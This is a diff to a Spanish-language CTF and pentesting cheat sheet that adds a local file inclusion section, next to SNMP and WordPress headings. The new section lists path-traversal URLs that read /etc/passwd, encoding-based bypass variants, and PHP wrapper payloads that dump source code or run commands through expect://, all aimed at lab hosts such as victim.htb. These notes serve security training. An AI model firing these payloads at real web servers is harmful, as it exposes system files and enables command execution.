@@ -55,8 +55,42 @@ Tips:
 
 `openssl s_client -connect domain.htb:443` # obteniendo información en webs con certificados ssl
 
+## LFI 
 
-## SNMP Enumeration 
+Esta vulnerabilidad nos permite visualizar recursos del sistema.
+
+`http://victim.htb/file.php?recurse=cars` # File.php, apunta a traves del parametro "recurse" al archivo cars.
+
+Siendo vulnerable, podemos apuntar a otro fichero moviendonos entre directorios. 
+
+`http://victim.htb/file.php?recurse=../../../../../etc/passwd` # Apuntamos a "passwd" movimiendonos de directorios.
+
+**ByPass LFI**
+
+``
+http://victim.htb/file.php?recurse=../../../../../etc/passwd% 
+
+http://victim.htb/file.php?recurse=../../../../../etc/passwd?
+
+http://victim.htb/file.php?recurse=%252e%252e%252fetc%252fpasswd
+
+http://victim.htb/file.php?recurse=....//....//....//....//....//etc/passwd
+
+``
+
+**Wrappers LFI**
+
+``
+http://victim.htb/file.php?recurse=php://filter/read=string.rot13/resource=index.php
+
+http://victim.htb/file.php?recurse=php://filter/convert.base64-encode/resource=index.php
+
+http://victim.htb/file.php?recurse=expect://whoami
+
+``
+
+
+# SNMP Enumeration 
 
 Generalmente corre sobre puertos UPD ( 161 ), nos puede permitir enumerar más de la cuenta a nivel de sistema. Para saber qué software corren, así como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.
 
@@ -73,7 +107,7 @@ Una vez obtenemos la *community string* </br>
  
 `nmap --script "snmp* and not snmp-brute" <target>` # Apoyo a las enumeraciones, script de nmap.
 
-## WordPress
+# WordPress
 
 Este gestor de contenidos (CMS) suele ser un punto clave en los CTF, contiene un panel de login y pluggins que suelen ser vulnerables.
 
